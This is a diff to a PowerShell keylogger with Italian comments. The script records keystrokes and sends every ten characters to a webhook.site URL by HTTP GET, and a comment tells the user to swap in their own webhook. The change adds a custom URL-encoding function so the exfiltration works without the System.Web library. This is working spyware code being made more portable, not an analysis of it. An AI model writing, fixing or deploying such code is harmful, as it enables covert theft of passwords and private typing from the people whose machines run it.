@@ -1,3 +1,9 @@
+function UrlEncode {
+    param([string]$value)
+    $encoded = [System.Uri]::EscapeDataString($value)
+    return $encoded
+}
+
 $webhook = "https://webhook.site/fbea19fd-c6a4-4fe7-b371-c0066a01848e"  # Sostituisci con il tuo Webhook
 $log = ""
 
@@ -17,7 +23,7 @@ while ($true) {
             $key = [char]$ascii
             $log += $key
             if ($log.Length -ge 10) {  # Invia i dati ogni 10 caratteri
-                $encodedLog = [System.Web.HttpUtility]::UrlEncode($log)
+                $encodedLog = UrlEncode $log
                 $url = "$webhook?keys=$encodedLog"
                 Invoke-WebRequest -Uri $url -Method GET
                 $log = ""
